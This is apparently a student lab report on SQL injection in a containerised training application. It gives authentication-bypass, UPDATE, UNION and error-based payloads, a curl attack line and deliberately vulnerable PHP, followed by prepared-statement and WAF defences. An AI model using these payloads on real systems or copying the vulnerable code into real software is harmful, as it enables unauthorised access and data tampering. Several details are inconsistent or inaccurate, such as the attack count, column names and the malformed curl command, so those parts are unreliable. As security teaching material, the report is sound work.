# üíâ SQL Injection Lab Report: Complete Assessment & Remediation

![Lab Report](https://img.shields.io/badge/Status-Completed-brightgreen)
![Framework](https://img.shields.io/badge/Framework-OWASP%20Security-blue)
![Tools](https://img.shields.io/badge/Tools-Docker%2C%20MySQL%2C%20SQLMap-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Advanced-red)
![Duration](https://img.shields.io/badge/Duration-Multi%20Day-lightblue)

---

## **1. Lab Title**

> SQL Injection Vulnerability Assessment: Comprehensive Exploitation, Analysis, and Defense Implementation

---

## **2. Purpose and Objectives**

Conduct complete SQL Injection assessment through vulnerability identification, controlled exploitation, and implementation of defense mechanisms. This end-to-end lab demonstrates attack methodologies, database extraction techniques, and industry-standard remediation strategies.

**Key Learning Outcomes:**
- Understand SQL Injection attack vectors on SELECT and UPDATE statements
- Execute authentication bypass and data extraction attacks
- Perform unauthorized database record modification
- Implement prepared statements and parameterized queries
- Deploy input validation, WAF, and privilege separation defenses
- Compare vulnerable vs secure code implementations

---

## **3. Frameworks & Technologies**

- **SQL Injection** ‚Äî Malicious SQL query insertion via user input
- **Containerization** ‚Äî Docker and docker-compose for isolated testing
- **MySQL Database** ‚Äî Relational database with credential storage
- **Prepared Statements** ‚Äî Parameterized queries for injection prevention
- **SQLMap** ‚Äî Automated SQL injection framework
- **OWASP Top 10** ‚Äî Critical web vulnerability classification
- **Web Application Firewall** ‚Äî Protocol-level attack detection

---

## **4. Lab Environment**

**Host OS:** Ubuntu 20.04 VM
**Containerization:** Docker and docker-compose
**Web Application:** Employee Management System (vulnerable + hardened versions)
**Database:** MySQL (credential table with user profiles)
**Web Server:** Apache/PHP
**Access URL:** http://www.seed-server.com

**Container Architecture:**
- **Container 1:** Vulnerable web application (PHP backend)
- **Container 2:** MySQL database server
- **Network:** Internal Docker network

---

## **5. Container Setup & Management**

**Initialization Commands:**
```bash
$ docker-compose build     # Build container images
$ docker-compose up        # Start all containers
$ docker-compose down      # Stop and remove containers
$ dockps                   # List running containers
$ docksh <container_id>    # Open shell in container
```

**Database Access:**
```bash
$ mysql -u root -pdees
mysql> use sqllab_users;
mysql> show tables;
mysql> SELECT * FROM credential;
mysql> SELECT * FROM credential WHERE name='Alice';
```

---

## **6. Application Overview**

**Application:** Employee Management System

**Features:**
- Employee authentication and profile management
- Personal information viewing and editing
- Role-based access (Administrator, Employee)
- Salary and credential management

**Database Schema:**
- **Table:** credential
- **Columns:** id, name, password, salary, ssn, phone_number
- **Data:** Pre-populated test employees

**Vulnerable Components:**
- Login authentication (unparameterized SELECT)
- Profile update functionality (unparameterized UPDATE)
- Direct SQL concatenation with user input

---

## **7. Attack Phase: 7 SQL Injection Techniques**

### **Task 1: Database Reconnaissance**

**Objective:** Map database structure and identify attack targets

**Execution:**
```bash
mysql> use sqllab_users;
mysql> show tables;
mysql> SELECT * FROM credential WHERE name='Alice';
```

**Observations:**
- Single credential table stores all user data
- No encryption or access controls on test data
- All columns directly queryable without restrictions

**Result:** ‚úÖ Database mapped; targets identified

---

### **Task 2: Authentication Bypass (SELECT Injection)**

**Objective:** Bypass login authentication via SQL injection

**Attack Vector:** `' OR '1'='1' --`

**Vulnerable Code:**
```php
$query = "SELECT * FROM credential WHERE name='" . $username . "' AND password='" . $password . "'";
$result = $conn->query($query);
```

**Web Interface Attack:**
- Username: `' OR '1'='1' --`
- Password: (any value)
- Modified Query: `SELECT * FROM credential WHERE name='' OR '1'='1' --' AND password='[anything]'`
- Condition `'1'='1'` always TRUE; `--` comments out password check

**Command-Line Attack:**
```bash
$ curl 'www.seed-server.com/unsafe_home.php?username=admin&password=' OR '1'='1' -- '
```

**Result:** ‚úÖ Successfully authenticated as admin without credentials

---

### **Task 3: UPDATE Statement Injection - Salary Modification**

**Objective:** Modify database records through UPDATE injection

**Attack Payload:** Injected into salary update field
```sql
UPDATE credential SET salary=999999 WHERE username='alice'#
```

**Vulnerable Code:**
```php
$query = "UPDATE credential SET salary='" . $salary_input . "' WHERE name='" . $name . "'";
$conn->query($query);
```

**Execution:**
- Modified Alice's salary to unauthorized value
- No authorization check on data modification
- Change persisted in database

**Result:** ‚úÖ Successfully modified salary field; financial data compromised

---

### **Task 4: Password Modification Attack**

**Objective:** Change user passwords with encryption

**Attack Payload:** Injected password update with SHA1 encryption
```sql
UPDATE credential SET password=SHA1('newpassword123') WHERE name='Boby'#
```

**Execution:**
- Changed Boby's password to attacker-controlled value
- Applied correct encryption method (SHA1)
- Created persistent backdoor access

**Result:** ‚úÖ Successfully changed password; account takeover complete

---

### **Task 5: Profile Update Injection - Credential Backdoor**

**Objective:** Create unauthorized access credentials

**Attack Payload:** Chained UPDATE statements
```sql
username', password='backdoor123'#
```

**Execution:**
- Modified user profile to create backdoor access
- Injected malicious credentials into database
- Enabled persistent unauthorized access mechanism

**Result:** ‚úÖ Created backdoor; persistent compromise achieved

---

### **Task 6: Union-Based Data Extraction**

**Objective:** Extract sensitive database information

**Attack Vector:** UNION-based injection for enumeration

**Payload:**
```sql
' UNION SELECT username, password, email FROM users #
```

**Execution:**
- Identified number of columns in original query (3)
- Crafted UNION statement with matching column count
- Retrieved usernames, password hashes, and email addresses
- Extracted data from multiple tables simultaneously

**Result:** ‚úÖ Extracted sensitive records; credential compromise

---

### **Task 7: Error-Based Data Extraction**

**Objective:** Map database structure via error messages

**Attack Vector:** Malformed queries revealing database information

**Payload:**
```sql
' AND (SELECT 1 FROM information_schema.tables WHERE table_schema=database())
```

**Execution:**
- Submitted intentionally malformed SQL
- Database error messages revealed schema information
- Identified table names and structure
- Extracted sensitive data through error analysis

**Result:** ‚úÖ Mapped database structure; identified high-value targets

---

## **8. Vulnerability Analysis**

**Root Causes:**
1. **Direct String Concatenation** ‚Äî User input concatenated into SQL queries
2. **No Input Validation** ‚Äî Special characters accepted without filtering
3. **No Input Sanitization** ‚Äî SQL keywords not sanitized
4. **Dynamic Query Construction** ‚Äî Query logic determined by user input
5. **Improper Error Handling** ‚Äî Database errors reveal structure
6. **Excessive Permissions** ‚Äî Application user has too many privileges

**Attack Success Factors:**
- Application trusts user input as SQL code
- Boolean logic enables authentication bypass (`1=1`)
- Comment syntax (`--`) removes query constraints
- UPDATE functionality exposes data modification
- Multiple attack vectors leverage same vulnerability

| Attack Type | Severity | Data Impact | Ease |
|------------|----------|-------------|------|
| Auth Bypass | **CRITICAL** | Account compromise | Easy |
| UPDATE Injection | **CRITICAL** | Data modification | Moderate |
| Password Change | **CRITICAL** | Takeover | Moderate |
| Salary Modification | **HIGH** | Financial tampering | Moderate |
| Data Extraction | **CRITICAL** | Exposure | Advanced |
| Error-based Extraction | **CRITICAL** | Schema mapping | Advanced |

---

## **9. Defense Phase: Prevention & Mitigation**

### **Countermeasure 1: Prepared Statements (Primary Defense)**

**Secure SELECT Implementation:**
```php
$stmt = $conn->prepare("SELECT id FROM credential WHERE name = ? AND password = ?");
$stmt->bind_param("ss", $input_uname, $hashed_pwd);
$stmt->execute();
$result = $stmt->get_result();
```

**Secure UPDATE Implementation:**
```php
$stmt = $conn->prepare("UPDATE credential SET salary = ? WHERE name = ?");
$stmt->bind_param("ds", $new_salary, $employee_name);
$stmt->execute();
```

**Key Features:**
- Placeholders (`?`) separate SQL structure from data
- `bind_param()` safely binds user input
- Type specification enforces data types
- User input treated as data only, never executable code

**Testing Result:** ‚úÖ All injection attacks prevented

---

### **Countermeasure 2: Input Validation & Sanitization**

- Whitelist allowed characters (alphanumeric, specific symbols)
- Enforce data type (integers numeric only)
- Apply length restrictions on all inputs
- Reject SQL keywords (SELECT, UNION, DELETE, etc.)
- Validate email format and special field requirements

**Implementation:**
```php
if (!preg_match("/^[a-zA-Z0-9_]+$/", $username)) {
    die("Invalid username format");
}
if (strlen($username) > 50) {
    die("Username too long");
}
```

---

### **Countermeasure 3: Least Privilege Database Access**

- Create separate database users with minimal permissions
- Application user: SELECT, UPDATE only (no DELETE/DROP)
- Restrict to specific tables
- Separate read-only vs read-write accounts
- Disable administrative access for application

**Database Configuration:**
```sql
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'secure_password';
GRANT SELECT, UPDATE ON sqllab_users.* TO 'app_user'@'localhost';
```

---

### **Countermeasure 4: Error Handling & Logging**

- Display generic error messages to users
- Log detailed errors server-side only
- Avoid revealing database structure in responses
- Implement rate limiting on failed queries
- Monitor for SQL injection patterns

**Implementation:**
```php
if ($result === false) {
    error_log("Database error: " . $conn->error);
    echo "An error occurred. Please try again.";
}
```

---

### **Countermeasure 5: Web Application Firewall (WAF)**

- Deploy WAF with SQL injection detection rules
- Monitor for suspicious query patterns
- Block requests containing SQL keywords in parameters
- Alert on multiple injection attempts
- Log all blocked requests for analysis

**WAF Rules:**
- Block requests with UNION keyword
- Block comment syntax (--,  #)
- Block multiple statements (;)
- Block known injection patterns
- Rate limit login attempts

---

### **Countermeasure 6: Regular Security Testing**

- Automated SQL injection scanning tools (SQLMap, Acunetix)
- Manual penetration testing
- Code review for vulnerable patterns
- Dependency vulnerability scanning
- Security testing in CI/CD pipeline

---

## **10. Vulnerable vs Secure Code Comparison**

**VULNERABLE CODE:**
```php
$username = $_GET['username'];
$password = $_GET['password'];
$query = "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'";
$result = $conn->query($query);
```

**SECURE CODE:**
```php
$username = $_GET['username'];
$password = $_GET['password'];

// Validate input
if (!preg_match("/^[a-zA-Z0-9_]+$/", $username)) {
    die("Invalid username");
}

// Use prepared statement
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

---

## **11. Attack vs Defense Results**

| Aspect | Vulnerable | Prepared Statement |
|--------|-----------|-------------------|
| Auth Bypass | ‚úÖ Possible | ‚ùå Prevented |
| Data Extraction | ‚úÖ Possible | ‚ùå Prevented |
| Data Modification | ‚úÖ Possible | ‚ùå Prevented |
| Query Concatenation | Dynamic | Static |
| Input Treatment | Code | Data |
| Type Checking | None | Enforced |
| SQL Injection Risk | **CRITICAL** | **NONE** |

---

## **12. Key Takeaways**

- **SQL Injection is critical:** Requires minimal skill; massive impact on data
- **String concatenation is dangerous:** Never build queries from user input
- **Prepared statements essential:** Only reliable defense for injection attacks
- **Defense-in-depth required:** Prepared statements + validation + WAF + monitoring
- **Both SELECT and UPDATE vulnerable:** All SQL queries at risk
- **Input validation important:** Second line of defense after prepared statements
- **Regular testing critical:** Vulnerability scanning should be automated
- **Least privilege matters:** Limiting database permissions reduces damage scope
- **Error handling matters:** Verbose errors reveal database structure to attackers
- **Secure coding mandatory:** Industry standard practice, not optional

---

## **13. Conclusion**

This comprehensive SQL Injection lab successfully demonstrated complete vulnerability assessment through identification, exploitation, and remediation. By executing seven distinct attack vectors (authentication bypass, UPDATE injection, password modification, salary manipulation, UNION extraction, and error-based extraction) on a containerized Employee Management System, the exercise illustrated the critical severity of improper query construction.

Vulnerable code using direct string concatenation was easily compromised through simple injection payloads, enabling attackers to bypass authentication, modify data, and extract sensitive information. However, implementation of prepared statements with parameterized queries completely eliminated injection vulnerabilities, demonstrating that secure coding practices effectively prevent this critical attack vector.

The use of Docker containers provided isolated testing environments enabling safe exploitation without production risk. Combined analysis of both attack and defense mechanisms reinforces that SQL Injection, despite being well-known and easily preventable, continues affecting millions of web applications due to inadequate secure coding practices.

Organizations must mandate prepared statement usage, implement input validation, deploy web application firewalls, restrict database privileges, and conduct regular security testing. This lab provides practical evidence that robust database security is achievable through proper coding standards and defense-in-depth strategies.

---

## **14. Artifacts & Deliverables**

- **Docker Configuration:** docker-compose.yml and Dockerfile
- **Vulnerable PHP Code:** Original application with SQL concatenation
- **Secure PHP Code:** Refactored with prepared statements
- **SQL Injection Payloads:** All attack strings tested
- **MySQL Queries:** Database structure and test data
- **Attack Evidence:** Screenshots of successful exploitation
- **cURL Commands:** Command-line injection examples
- **Prepared Statement Examples:** Defense implementation code
- **WAF Rules:** SQL injection detection configurations
- **Testing Report:** Defense verification results

---

## **15. References**

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- OWASP Top 10: https://owasp.org/Top10/
- CWE-89 SQL Injection: https://cwe.mitre.org/data/definitions/89.html
- MySQL Prepared Statements: https://dev.mysql.com/doc/
- Docker Documentation: https://docs.docker.com/
- SQLMap Documentation: http://sqlmap.org/

---
